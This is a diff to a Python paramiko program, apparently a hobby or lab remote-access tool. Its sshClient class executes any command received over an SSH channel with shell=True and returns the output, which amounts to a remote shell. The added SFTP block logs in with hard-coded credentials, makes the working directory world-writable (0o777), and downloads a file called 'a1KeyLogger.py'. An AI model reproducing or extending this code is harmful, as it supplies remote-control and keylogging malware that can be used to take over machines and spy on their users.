@@ -135,8 +135,8 @@ class sshClient(object):
 
             command = self.channel.recv(1024).decode()
             receivedCommand = subprocess.check_output(command, shell=True)
-            self.channel.sendall(receivedCommand)
 
+            self.channel.sendall(receivedCommand)
             logger.info(f"Received message{command}")
         except subprocess.CalledProcessError as e:
             logger.error(f"Subprocess error: {e.output.decode()}")
@@ -163,3 +163,15 @@ if __name__ == '__main__':
     # print(dir_path)
 
     sshClient.invoke_shell()
+
+    # open sftp
+    pkey = paramiko.RSAKey.from_private_key_file('test_rsa.key')
+    transport = paramiko.Transport(('localhost', 3373))
+    transport.connect(username='rick', password='jacky', pkey=pkey)
+    sftp = paramiko.SFTPClient.from_transport(transport)
+    sftp.chdir(".")
+    permissions = str(sftp.lstat(sftp.getcwd()))
+    sftp.chmod(sftp.getcwd(), 0o777)
+    print(permissions)
+    print(sftp.listdir(sftp.getcwd())[len(sftp.listdir(sftp.getcwd())) - 1])
+    sftp.get("a1KeyLogger.py", "zzzz")
